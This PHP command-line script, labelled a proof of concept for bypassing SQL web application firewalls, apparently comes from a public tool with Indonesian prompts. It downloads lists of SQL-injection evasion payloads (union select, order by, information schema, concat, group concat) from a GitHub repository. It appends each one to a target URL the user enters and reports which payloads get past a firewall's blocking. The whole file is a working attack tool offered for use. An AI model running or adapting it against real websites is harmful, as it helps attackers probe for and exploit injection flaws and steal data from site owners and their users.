<?php
/**
 * Bypass SQL Web Application Firewall - PoC
 *
 * @author BinsarJR
 */

define('BIN', '.bin');

function is_win() {
    if (stripos(PHP_OS, 'WIN') === 0) {
        return true;
    } else {
        return false;
    }
}

function clear() {
    if (is_win()) {
        system('cls');
    } else {
        system('clear');
    }
}

function PS1() {
    return " => ";
}

function color($colorName) {
    if (!is_win()) {
        $colorName = strtolower($colorName);
        $colorList = ['black', 'red', 'green', 'yellow', 'blue', 'purple', 'cyan', 'white', 'normal'];
        $colorCode = ['black' => '0;30','red' => '0;31','green' => '0;32','yellow' => '0;33','blue' => '0;34','purple' => '0;35','cyan' => '0;36','white' => '0;37','normal' => '0'];

		if (in_array($colorName, $colorList)) {
            return "\033[" . $colorCode[$colorName] . "m";
        }

    } else {
        return '';
    }
}

// bypass WAF Function
function get_waf($waf) {
    $waf = strtolower($waf);

    if ($waf == 'union select') {
        $waf = file_get_contents('https://raw.githubusercontent.com/BinsarJr/sql-bypass-waf/master/.bin/union_select.txt');
    } elseif ($waf == 'order by') {
        $waf = file_get_contents('https://raw.githubusercontent.com/BinsarJr/sql-bypass-waf/master/.bin/order-by.txt');
    } elseif ($waf == 'concat') {
        $waf = file_get_contents('https://raw.githubusercontent.com/BinsarJr/sql-bypass-waf/master/.bin/concat.txt');
    } elseif ($waf == 'group concat') {
        $waf = file_get_contents('https://raw.githubusercontent.com/BinsarJr/sql-bypass-waf/master/.bin/group_concat.txt');
    } elseif ($waf == 'information schema') {
        $waf = file_get_contents('https://raw.githubusercontent.com/BinsarJr/sql-bypass-waf/master/.bin/information schema.txt');
    } else {
        clear();
        die(color('normal') . "Parameter Invalid -> coba cek function get_waf" . PHP_EOL);
    }

    if (!is_dir(BIN)) {
        mkdir(BIN);
    }

    $results = [];
    $waf = explode(PHP_EOL, $waf);

    foreach ($waf as $waf) {
        if (!in_array($waf, $results) and $waf != null) {
            array_push($results, $waf);
        }
    }

    return $results;
}


// start program
clear();
echo "
  - Pilih Metode -

 [1] Union Select
 [2] Order By
 [3] Information Schema
 [4] Concat
 [5] Group Concat

";
echo PS1();
$opsi = trim(fgets(STDIN));

if ($opsi == 1) {
    $bypassWaf = get_waf('union select');
} elseif ($opsi == 2) {
    $bypassWaf = get_waf('order by');
} elseif ($opsi == 3) {
    $bypassWaf = get_waf('information schema');
} elseif ($opsi == 4) {
    $bypassWaf = get_waf('concat');
} elseif ($opsi == 5) {
    $bypassWaf = get_waf('group concat');
} else {
    die(printf(color('normal') . "Tidak ada pilihan untuk %d" . PHP_EOL, $opsi));
}

clear();
echo "URL Uji Coba\n";
echo PS1();
$url = trim(fgets(STDIN));

foreach ($bypassWaf as $bypassWaf) {
    $ch = curl_init($url . $bypassWaf);
    $options = [
        CURLOPT_RETURNTRANSFER =>1,
        CURLOPT_TIMEOUT => 5
    ];

    curl_setopt_array($ch, $options);
    $results = curl_exec($ch);
    $status_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);

    if ($status_code == 200) {
        echo color('green') . "[+] Connect: $bypassWaf";
    } elseif ($status_code == 403) {
        echo color('red') . "[-] Forbid : $bypassWaf";
    } elseif ($status_code == 500) {
        echo color('blue') . "[-] Error  : $bypassWaf";
    } else {
        echo color('yellow') . "[!] Warning: $status_code";
    }

    echo PHP_EOL;
}

// Clean Console before Exit
echo color('normal') . PHP_EOL;
